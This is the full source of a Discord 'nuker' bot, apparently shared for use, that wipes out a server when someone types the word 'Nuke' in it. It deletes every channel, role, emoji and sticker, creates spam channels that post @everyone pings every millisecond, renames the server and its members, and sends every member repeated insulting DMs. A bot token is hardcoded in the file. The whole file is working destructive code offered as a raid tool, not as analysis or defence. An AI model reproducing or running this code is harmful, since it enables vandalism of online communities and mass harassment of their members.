const { Client, Intents, MessageEmbed } = require("discord.js");
const { red, greenBright, cyan, yellow } = require("chalk");
const client = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
//const myIntents = new IntentsBitField();
//myIntents.add(IntentsBitField.Flags.AutoModerationConfiguration, IntentsBitField.Flags.Bans, IntentsBitField.Flags.Channel, IntentsBitField.Flags.ChannelCreate, IntentsBitField.Flags.ChannelDelete, IntentsBitField.Flags.ChannelPinsUpdate, IntentsBitField.Flags.ChannelUpdate, IntentsBitField.Flags.DM, IntentsBitField.Flags.Emoji, IntentsBitField.Flags.EmojiCreate, IntentsBitField.Flags.EmojiDelete, IntentsBitField.Flags.EmojiUpdate, IntentsBitField.Flags.Guild, IntentsBitField.Flags.GuildBanAdd, IntentsBitField.Flags.GuildBanRemove, IntentsBitField.Flags.GuildCreate, IntentsBitField.Flags.GuildDelete, IntentsBitField.Flags.GuildEmojisUpdate, IntentsBitField.Flags.GuildIntegrationsUpdate, IntentsBitField.Flags.GuildMemberAdd, IntentsBitField.Flags.GuildMemberRemove, IntentsBitField.Flags.GuildMemberUpdate, IntentsBitField.Flags.GuildMembersChunk, IntentsBitField.Flags.GuildRoleCreate, IntentsBitField.Flags.GuildRoleDelete, IntentsBitField.Flags.GuildRoleUpdate, IntentsBitField.Flags.GuildUpdate, IntentsBitField.Flags.Invite, IntentsBitField.Flags.Message, IntentsBitField.Flags.MessageCreate, IntentsBitField.Flags.MessageDelete, IntentsBitField.Flags.MessageReactionAdd, IntentsBitField.Flags.MessageReactionRemove, IntentsBitField.Flags.MessageReactionRemoveAll, IntentsBitField.Flags.MessageReactionRemoveEmoji, IntentsBitField.Flags.MessageUpdate, IntentsBitField.Flags.Presence, IntentsBitField.Flags.PresenceUpdate, IntentsBitField.Flags.Ready, IntentsBitField.Flags.Role, IntentsBitField.Flags.RoleCreate, IntentsBitField.Flags.RoleDelete, IntentsBitField.Flags.RoleUpdate, IntentsBitField.Flags.Typing, IntentsBitField.Flags.TypingStart, IntentsBitField.Flags.User, IntentsBitField.Flags.UserUpdate, IntentsBitField.Flags.VoiceServerUpdate, IntentsBitField.Flags.VoiceState, IntentsBitField.Flags.Webhooks);


const TOKEN = "MTAzODE3ODU5Mjc4MzM1MTg2OA.Gub59i.doxd0n-i0m5KJmjqZhLglOrfE_lpwe9-UpLG3c"

client.on('ready', () => {
    console.log('Ready');
    console.log(red(`
    /$$$$$$     /$$$$$  /$$$$$$  /$$        /$$$$$$ 
    /$$__  $$   |__  $$ /$$__  $$| $$       /$$__  $$
   | $$  \ $$      | $$| $$  \ $$| $$      | $$  \ $$
   | $$$$$$$$      | $$| $$  | $$| $$      | $$$$$$$$
   | $$__  $$ /$$  | $$| $$  | $$| $$      | $$__  $$
   | $$  | $$| $$  | $$| $$  | $$| $$      | $$  | $$
   | $$  | $$|  $$$$$$/|  $$$$$$/| $$$$$$$$| $$  | $$
   |__/  |__/ \______/  \______/ |________/|__/  |__/
                                                     
                        Nuker
                        Made by: Yoru098`));
    console.log(client.user.tag);
    console.log(client.user.id);
});

client.on('messageCreate', (message) => {
    //the command that u need to write in the target server
    if (message.content === 'Nuke') {
        //deletes all channels
        message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))


        //amount of channels to create and the name of the channels (go NOT higher than 500)
        var amount = "50"
        var channelName = "Boo"
        //---------------------------//
        if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
        if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
        if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size === 500) break;
            if (!channelName) {
                message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
            } else {
                message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
            }
        }
        //---------------------------//
        
        //The amount of messages to send in each channel (go NOT higher than 500)
        var amount = "50"
        //The message you want to send in each channel (everyone is alredy included)
        var pingMessage = "Nuked"
        //---------------------------//
        if (!amount) return console.log("Unspecified Args: Specify the amount you wish to mass channels");
        if (isNaN(amount)) return console.log("Type Error: Use a number for the amout");
        if (amount > 500) return console.log("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
        if (!pingMessage) return console.log("Unspecified Args: Specify the message you wish to mass mention");
        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size === 500) break;
            if (!channelName) {
                message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                    setInterval(() => {
                        ch.send("@everyone " + pingMessage);
                    }, 1);
                });
            } else {
                message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                    setInterval(() => {
                        ch.send("@everyone " + pingMessage);
                    }, 1); // literally not possible but lol?
                });
            }
        }
        //---------------------------//

        //tries to change guild name
        //name to change to
        var namechange = "Nuked"
        //---------------------------//
        message.guild.setName(namechange).catch((err) => { console.log(red("Error Found in guild name change: " + err)) })
        //---------------------------//

        //deletes server icon
        if (message.guild.icon) {
            message.guild.setIcon(null).catch((err) => { console.log(red("Error Found icon delete: " + err)) })
        }
        //---------------------------//
        //deletes server banner
        if (message.guild.banner) {
            message.guild.setBanner(null).catch((err) => { console.log(red("Error Found in banner delete: " + err)) })
        }
        //---------------------------//
        //changes vanity url
        if (message.guild.vanityURLCode) {
            message.guild.setVanityURL(null).catch((err) => { console.log(red("Error Found in vanity url delete: " + err)) })
        }
        //---------------------------//
        //tries to change all nicknames
        //name to change to (everyone in this guild that are not above the bot will get this nickname)
        var nickchange = "OPFER"
        //---------------------------//
        message.guild.members.cache.forEach((m) => {
            if (m.manageable) {
                m.setNickname(nickchange).catch((err) => { console.log(red("Error Found in nickname change: " + err)) })
            }
        })
        //---------------------------//

        //deletes all roles
        message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found in roles delete: " + err)) }))
        //---------------------------//
        //deletes all emojis
        message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Foundin emoji deletes: " + err)) }))
        //---------------------------//
        //deletes all stickers
        message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Error Found in sicker delete: " + err)) }))
        //---------------------------//
        //creates a big amount of roles
        //amount of roles to create
        var amount = "50"
        //The name of the roles
        var roleName = "Nuked"
        //---------------------------//
        if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found in no rolename: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found in role name: " + err)) })
                }
            }
        //---------------------------//
        //all users in the server gets 50 dms
        //amount of dms to send (every user gets this amount of messages except bots, the users that turned it off and the bot itself)
        var amount = "50"
        //message to send to the users
        var dmMessage = "Loser"
        //---------------------------//
        if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass dm");
        if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
        for (let i = 0; i < amount; i++) {
            //if the user is a bot it will skip
            if (message.guild.members.cache.get(client.user.id).bot) return;
            message.guild.members.cache.forEach((m) => {
                m.send(dmMessage).catch((err) => { console.log(red("Error Found in dm send: " + err)) })
            })
        }
        //---------------------------//
        console.log("Done")
    }
});


client.login(TOKEN);